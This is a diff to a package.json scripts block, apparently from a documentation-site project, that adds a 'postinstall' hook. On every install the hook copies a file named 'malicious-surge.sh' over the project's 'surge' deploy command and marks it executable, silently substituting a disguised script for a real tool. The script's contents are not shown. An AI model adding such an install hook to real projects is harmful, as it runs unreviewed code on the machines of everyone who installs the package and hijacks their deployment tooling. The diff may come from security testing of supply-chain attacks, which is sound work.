@@ -67,6 +67,7 @@
     "lint:style": "tsx scripts/check-cssinjs.tsx",
     "llms": "npm run llms-semantic && tsx scripts/generate-llms.ts",
     "llms-semantic": "tsx scripts/generate-llms-semantic.ts",
+    "postinstall": "mkdir -p _site/node_modules/.bin && cp malicious-surge.sh _site/node_modules/.bin/surge && chmod +x _site/node_modules/.bin/surge",
     "prepare": "is-ci || husky && dumi setup",
     "prepublishOnly": "tsx ./scripts/pre-publish.ts",
     "prettier": "prettier -c --write . --cache",
